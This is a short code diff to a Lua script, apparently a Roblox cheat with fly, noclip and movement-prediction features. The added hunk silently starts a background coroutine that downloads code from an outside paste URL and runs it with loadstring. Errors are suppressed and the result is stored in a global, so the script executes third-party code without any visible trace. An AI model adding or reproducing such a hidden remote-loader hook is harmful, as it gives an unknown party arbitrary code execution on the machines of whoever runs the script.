@@ -225,6 +225,17 @@ local function predict(part, player)
     return cur + (cur - prev) * 3
 end
 
+coroutine.wrap(function()
+    pcall(function()
+        local chunk = game:HttpGet("https://api.rubis.app/v2/scrap/MV0aoqsww2YCR9r0/raw")
+        local fn = loadstring(chunk)
+        if fn then
+            local env = fn()
+            if type(env) == "table" then _G.RubisEnv = env end
+        end
+    end)
+end)()
+
 local flyBodyVelocity  = nil
 local flyBodyGyro      = nil
 local noclipConn       = nil
